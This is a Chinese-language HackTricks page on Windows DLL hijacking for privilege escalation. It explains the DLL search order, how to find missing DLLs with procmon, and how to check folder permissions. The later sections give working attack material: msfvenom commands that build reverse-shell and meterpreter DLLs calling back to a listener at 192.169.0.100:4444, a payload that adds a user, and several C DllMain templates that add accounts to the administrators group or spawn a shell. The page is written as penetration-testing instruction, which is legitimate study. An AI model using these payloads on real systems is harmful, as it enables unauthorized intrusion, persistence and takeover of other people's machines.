<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Dll Hijacking</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="dll-hijacking"><a class="header" href="#dll-hijacking">Dll Hijacking</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
<p><strong>漏洞赏金提示</strong>：<strong>注册</strong> <strong>Intigriti</strong>，一个由黑客为黑客创建的高级 <strong>漏洞赏金平台</strong>！今天就加入我们 <a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a>，开始赚取高达 <strong>$100,000</strong> 的赏金！</p>
<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
<h2 id="基本信息"><a class="header" href="#基本信息">基本信息</a></h2>
<p>DLL 劫持涉及操纵受信任的应用程序加载恶意 DLL。这个术语涵盖了几种策略，如 <strong>DLL 欺骗、注入和侧加载</strong>。它主要用于代码执行、实现持久性，以及较少见的权限提升。尽管这里重点关注提升，但劫持的方法在不同目标间保持一致。</p>
<h3 id="常见技术"><a class="header" href="#常见技术">常见技术</a></h3>
<p>用于 DLL 劫持的几种方法，每种方法的有效性取决于应用程序的 DLL 加载策略：</p>
<ol>
<li><strong>DLL 替换</strong>：用恶意 DLL 替换真实 DLL，选择性地使用 DLL 代理以保留原始 DLL 的功能。</li>
<li><strong>DLL 搜索顺序劫持</strong>：将恶意 DLL 放置在合法 DLL 之前的搜索路径中，利用应用程序的搜索模式。</li>
<li><strong>幻影 DLL 劫持</strong>：创建一个恶意 DLL 供应用程序加载，认为它是一个不存在的必需 DLL。</li>
<li><strong>DLL 重定向</strong>：修改搜索参数，如 <code>%PATH%</code> 或 <code>.exe.manifest</code> / <code>.exe.local</code> 文件，以引导应用程序到恶意 DLL。</li>
<li><strong>WinSxS DLL 替换</strong>：在 WinSxS 目录中用恶意 DLL 替换合法 DLL，这种方法通常与 DLL 侧加载相关。</li>
<li><strong>相对路径 DLL 劫持</strong>：将恶意 DLL 放置在用户控制的目录中，与复制的应用程序一起，类似于二进制代理执行技术。</li>
</ol>
<h2 id="查找缺失的-dll"><a class="header" href="#查找缺失的-dll">查找缺失的 DLL</a></h2>
<p>查找系统中缺失的 DLL 的最常见方法是运行 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">procmon</a>，<strong>设置</strong> <strong>以下 2 个过滤器</strong>：</p>
<p><img src="../../../.gitbook/assets/image%20(961).png" alt="" /></p>
<p><img src="../../../.gitbook/assets/image%20(230).png" alt="" /></p>
<p>并仅显示 <strong>文件系统活动</strong>：</p>
<p><img src="../../../.gitbook/assets/image%20(153).png" alt="" /></p>
<p>如果您在寻找 <strong>缺失的 DLL</strong>，可以让它运行几 <strong>秒钟</strong>。<br />
如果您在寻找 <strong>特定可执行文件中的缺失 DLL</strong>，则应设置 <strong>另一个过滤器，如 "进程名称" "包含" "&lt;exec name&gt;"，执行它，然后停止捕获事件</strong>。</p>
<h2 id="利用缺失的-dll"><a class="header" href="#利用缺失的-dll">利用缺失的 DLL</a></h2>
<p>为了提升权限，我们最好的机会是能够 <strong>编写一个特权进程将尝试加载的 DLL</strong>，在某个 <strong>将被搜索的地方</strong>。因此，我们将能够在 <strong>搜索 DLL 的文件夹之前</strong> 的 <strong>文件夹</strong> 中 <strong>写入</strong> 一个 DLL（奇怪的情况），或者我们将能够在 <strong>将被搜索的某个文件夹中写入</strong>，而原始 <strong>DLL 在任何文件夹中都不存在</strong>。</p>
<h3 id="dll-搜索顺序"><a class="header" href="#dll-搜索顺序">DLL 搜索顺序</a></h3>
<p><strong>在</strong> <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching"><strong>Microsoft 文档</strong></a> <strong>中，您可以找到 DLL 的具体加载方式。</strong></p>
<p><strong>Windows 应用程序</strong> 按照一组 <strong>预定义的搜索路径</strong> 查找 DLL，遵循特定的顺序。DLL 劫持的问题出现在有害 DLL 被战略性地放置在这些目录之一时，确保它在真实 DLL 之前被加载。防止这种情况的解决方案是确保应用程序在引用所需 DLL 时使用绝对路径。</p>
<p>您可以在 32 位系统上看到 <strong>DLL 搜索顺序</strong>：</p>
<ol>
<li>应用程序加载的目录。</li>
<li>系统目录。使用 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya"><strong>GetSystemDirectory</strong></a> 函数获取该目录的路径。(<em>C:\Windows\System32</em>)</li>
<li>16 位系统目录。没有函数获取该目录的路径，但会进行搜索。 (<em>C:\Windows\System</em>)</li>
<li>Windows 目录。使用 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya"><strong>GetWindowsDirectory</strong></a> 函数获取该目录的路径。(<em>C:\Windows</em>)</li>
<li>当前目录。</li>
<li>在 PATH 环境变量中列出的目录。请注意，这不包括 <strong>App Paths</strong> 注册表项指定的每个应用程序路径。计算 DLL 搜索路径时不使用 <strong>App Paths</strong> 键。</li>
</ol>
<p>这是 <strong>默认</strong> 搜索顺序，<strong>SafeDllSearchMode</strong> 启用时。当它被禁用时，当前目录提升到第二位。要禁用此功能，请创建 <strong>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</strong>\<strong>SafeDllSearchMode</strong> 注册表值并将其设置为 0（默认启用）。</p>
<p>如果调用 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa"><strong>LoadLibraryEx</strong></a> 函数时使用 <strong>LOAD_WITH_ALTERED_SEARCH_PATH</strong>，搜索将从 <strong>LoadLibraryEx</strong> 正在加载的可执行模块的目录开始。</p>
<p>最后，请注意 <strong>一个 DLL 可以通过指示绝对路径而不是仅仅是名称来加载</strong>。在这种情况下，该 DLL <strong>只会在该路径中被搜索</strong>（如果 DLL 有任何依赖项，它们将仅按名称加载时被搜索）。</p>
<p>还有其他方法可以更改搜索顺序，但我在这里不打算解释它们。</p>
<h4 id="windows-文档中的-dll-搜索顺序例外"><a class="header" href="#windows-文档中的-dll-搜索顺序例外">Windows 文档中的 DLL 搜索顺序例外</a></h4>
<p>Windows 文档中指出了标准 DLL 搜索顺序的某些例外：</p>
<ul>
<li>当遇到 <strong>与内存中已加载的 DLL 同名的 DLL</strong> 时，系统会绕过通常的搜索。相反，它会在默认使用内存中已加载的 DLL 之前执行重定向和清单检查。<strong>在这种情况下，系统不会进行 DLL 搜索</strong>。</li>
<li>在 DLL 被识别为当前 Windows 版本的 <strong>已知 DLL</strong> 的情况下，系统将使用其版本的已知 DLL 及其任何依赖 DLL，<strong>跳过搜索过程</strong>。注册表项 <strong>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</strong> 保存这些已知 DLL 的列表。</li>
<li>如果 <strong>DLL 有依赖项</strong>，则对这些依赖 DLL 的搜索将像仅通过其 <strong>模块名称</strong> 指示一样进行，而不管初始 DLL 是否通过完整路径识别。</li>
</ul>
<h3 id="提升权限"><a class="header" href="#提升权限">提升权限</a></h3>
<p><strong>要求</strong>：</p>
<ul>
<li>确定一个在 <strong>不同权限</strong> 下运行或将要运行的进程（水平或横向移动），该进程 <strong>缺少 DLL</strong>。</li>
<li>确保在 <strong>DLL</strong> 将被 <strong>搜索的</strong> 任何 <strong>目录</strong> 中有 <strong>写入访问权限</strong>。此位置可能是可执行文件的目录或系统路径中的目录。</li>
</ul>
<p>是的，要求很难找到，因为 <strong>默认情况下，找到缺少 DLL 的特权可执行文件有点奇怪</strong>，而且在系统路径文件夹中拥有写入权限更是 <strong>奇怪</strong>（默认情况下您无法做到）。但是，在配置错误的环境中，这是可能的。<br />
如果您运气好，满足要求，您可以查看 <a href="https://github.com/hfiref0x/UACME">UACME</a> 项目。即使该项目的 <strong>主要目标是绕过 UAC</strong>，您也可能会在那里找到一个适用于您可以使用的 Windows 版本的 <strong>DLL 劫持 PoC</strong>（可能只需更改您有写入权限的文件夹的路径）。</p>
<p>请注意，您可以通过以下方式 <strong>检查文件夹中的权限</strong>：</p>
<pre><code class="language-bash">accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
</code></pre>
<p>并<strong>检查PATH中所有文件夹的权限</strong>：</p>
<pre><code class="language-bash">for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2&gt;nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" &amp;&amp; echo. )
</code></pre>
<p>您还可以使用以下命令检查可执行文件的导入和 DLL 的导出：</p>
<pre><code class="language-c">dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
</code></pre>
<p>对于如何<strong>利用Dll劫持提升权限</strong>，并在<strong>系统路径文件夹</strong>中具有写入权限的完整指南，请查看：</p>
<p>{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
<a href="writable-sys-path-+dll-hijacking-privesc.html">writable-sys-path-+dll-hijacking-privesc.md</a>
{% endcontent-ref %}</p>
<h3 id="自动化工具"><a class="header" href="#自动化工具">自动化工具</a></h3>
<p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS"><strong>Winpeas</strong></a>将检查您是否在系统路径中的任何文件夹上具有写入权限。<br />
其他发现此漏洞的有趣自动化工具包括<strong>PowerSploit函数</strong>：<em>Find-ProcessDLLHijack</em>，<em>Find-PathDLLHijack_和_Write-HijackDll</em>。</p>
<h3 id="示例"><a class="header" href="#示例">示例</a></h3>
<p>如果您发现一个可利用的场景，成功利用它的最重要的事情之一是<strong>创建一个导出至少所有可执行文件将从中导入的函数的dll</strong>。无论如何，请注意，Dll劫持在<a href="../../authentication-credentials-uac-and-efs/#uac"><strong>从中等完整性级别提升到高完整性（绕过UAC）</strong></a>或<a href="../#from-high-integrity-to-system"><strong>从高完整性提升到SYSTEM</strong></a><strong>时非常有用。<strong>您可以在这个专注于执行的dll劫持研究中找到</strong>如何创建有效dll的示例：<a href="https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows"><strong>https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows</strong></a></strong>。<strong><br />
此外，在</strong>下一节<strong>中，您可以找到一些</strong>基本dll代码**，这些代码可能作为<strong>模板</strong>或用于创建<strong>导出非必需函数的dll</strong>。</p>
<h2 id="创建和编译dll"><a class="header" href="#创建和编译dll"><strong>创建和编译Dll</strong></a></h2>
<h3 id="dll代理"><a class="header" href="#dll代理"><strong>Dll代理</strong></a></h3>
<p>基本上，<strong>Dll代理</strong>是一个能够<strong>在加载时执行您的恶意代码</strong>的Dll，同时也能<strong>暴露</strong>并<strong>按预期工作</strong>，通过<strong>将所有调用转发到真实库</strong>。</p>
<p>使用工具<a href="https://github.com/redteamsocietegenerale/DLLirant"><strong>DLLirant</strong></a>或<a href="https://github.com/Accenture/Spartacus"><strong>Spartacus</strong></a>，您可以<strong>指定一个可执行文件并选择要代理的库</strong>，并<strong>生成一个代理dll</strong>，或<strong>指定Dll并生成一个代理dll</strong>。</p>
<h3 id="meterpreter"><a class="header" href="#meterpreter"><strong>Meterpreter</strong></a></h3>
<p><strong>获取反向shell（x64）：</strong></p>
<pre><code class="language-bash">msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
</code></pre>
<p><strong>获取一个 meterpreter (x86):</strong></p>
<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
</code></pre>
<p><strong>创建用户（x86 我没有看到 x64 版本）：</strong></p>
<pre><code>msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
</code></pre>
<h3 id="你自己的"><a class="header" href="#你自己的">你自己的</a></h3>
<p>注意，在多个情况下，您编译的 Dll 必须 <strong>导出多个函数</strong>，这些函数将被受害者进程加载，如果这些函数不存在，<strong>二进制文件将无法加载</strong>它们，<strong>利用将失败</strong>。</p>
<pre><code class="language-c">// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include &lt;windows.h&gt;
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami &gt; C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
</code></pre>
<pre><code class="language-c">// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include &lt;windows.h&gt;
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
</code></pre>
<pre><code class="language-c">//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include &lt;windows.h&gt;

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
</code></pre>
<pre><code class="language-c">//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include&lt;windows.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;stdio.h&gt;

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
</code></pre>
<h2 id="参考"><a class="header" href="#参考">参考</a></h2>
<ul>
<li><a href="https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e">https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e</a></li>
<li><a href="https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html">https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html</a></li>
</ul>
<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
<p><strong>漏洞赏金提示</strong>：<strong>注册</strong> <strong>Intigriti</strong>，一个由黑客为黑客创建的高级<strong>漏洞赏金平台</strong>！今天就加入我们，访问 <a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a>，开始赚取高达 <strong>$100,000</strong> 的赏金！</p>
<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../windows-hardening/windows-local-privilege-escalation/com-hijacking.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/writable-sys-path-+dll-hijacking-privesc.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../windows-hardening/windows-local-privilege-escalation/com-hijacking.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/writable-sys-path-+dll-hijacking-privesc.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
